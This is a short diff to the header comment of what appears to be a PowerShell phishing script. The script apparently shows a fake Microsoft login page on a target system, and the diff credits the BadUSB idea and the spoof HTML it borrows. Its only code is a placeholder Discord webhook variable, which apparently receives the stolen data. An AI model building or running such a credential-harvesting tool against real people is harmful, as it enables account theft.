@@ -10,7 +10,10 @@ SETUP
 USAGE
 1.Run script on target system.
 
-The HTML for this script was borrowed from https://github.com/JoniRinta-Kahila/microsoft-login-spoof, kudos for creating this great look-a-like! 
+CREDIT
+The original idea for this cam from - https://github.com/Zarcolio/flipperzero/blob/main/BadUSB/Ducky%20Scripts/Awareness/Phish_Office365_From_Usb.txt
+The HTML for this script was borrowed from - https://github.com/JoniRinta-Kahila/microsoft-login-spoof
+Kudos for creating this great look-a-like! 
 #>
 
 $dc = 'DISCORD_WEBHOOK_HERE'
